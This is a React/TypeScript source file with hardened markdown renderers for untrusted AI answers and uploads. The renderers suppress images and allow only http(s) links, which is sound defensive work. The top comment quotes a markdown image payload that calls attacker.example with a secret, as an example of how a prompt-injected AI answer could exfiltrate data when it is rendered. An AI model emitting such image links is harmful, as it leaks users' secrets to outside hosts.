import type { Components } from "react-markdown";

/**
 * Hardened renderers for markdown from untrusted sources (AI answers, uploaded documents).
 *
 * - Images are never loaded: a prompt-injected answer could otherwise embed
 *   `![](https://attacker.example/?q=<secret>)` and exfiltrate data just by being rendered.
 *   Only the alt text is shown.
 * - Links are only rendered for http(s) URLs, open in a new tab and carry
 *   rel="noopener noreferrer nofollow". Anything else is rendered as plain text.
 */

export function isSafeHttpUrl(href: string | undefined | null): href is string {
  if (!href) return false;
  try {
    const url = new URL(href);
    return url.protocol === "http:" || url.protocol === "https:";
  } catch {
    return false;
  }
}

export const safeMarkdownComponents: Pick<Components, "img" | "a"> = {
  img: ({ alt }) =>
    alt ? <span className="italic text-muted-foreground">[image: {alt}]</span> : null,
  a: ({ href, children }) =>
    isSafeHttpUrl(href) ? (
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer nofollow"
        referrerPolicy="no-referrer"
        className="text-primary underline underline-offset-2 break-all"
      >
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
};
